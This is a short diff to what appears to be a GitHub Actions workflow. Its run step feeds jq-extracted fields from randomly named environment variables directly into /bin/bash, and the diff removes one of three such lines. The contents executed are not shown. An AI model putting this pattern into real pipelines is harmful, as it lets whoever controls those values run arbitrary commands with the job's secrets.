@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$raq32804" | jq -r .ttf16665 | /bin/bash
           printf '%s' "$clp0400" | jq -r .nwkp353 | /bin/bash
-          echo $gd02000 | jq -r .ihm175 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
